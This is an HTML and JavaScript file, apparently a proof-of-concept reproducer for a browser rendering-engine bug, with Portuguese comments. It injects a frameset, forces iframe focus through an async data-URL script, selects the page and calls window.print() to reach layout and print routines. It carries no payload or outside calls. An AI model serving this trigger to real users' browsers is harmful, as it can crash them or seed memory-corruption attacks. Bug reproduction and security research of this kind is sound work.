
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  iframe {
    content: url();
    zoom: 0.01;
  }
</style>
</head>
<body>

<iframe id="i0"></iframe>

<script>
  window.addEventListener('load', () => {
    // 1. Injeta o frameset para alterar a árvore de frames raiz
    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');
    i0.onfocus = () => {
      location.hash = 'y';

      // Tenta forçar atualização profunda de layout durante o evento de foco
      try {
        window.getSelection().selectAllChildren(document.body || document.documentElement);
      } catch (e) {}
    };

    location.hash = 'x';

    // 2. Mantém o método original exato de injeção de script assíncrono via data URL
    let s0 = document.createElement('script');
    s0.src = `data:text/javascript,if(window.caches){caches.has('a').then(() => i0.focus());}else{setTimeout(() => i0.focus(), 0);}`;
    document.head.append(s0);

    // 3. Opcional: Tentar acionar o PrintContext (que chama rotinas de RenderTreeAsText)
    setTimeout(() => {
      try {
        window.print();
      } catch(e) {}
    }, 100);
  });
</script>
</body>
</html>
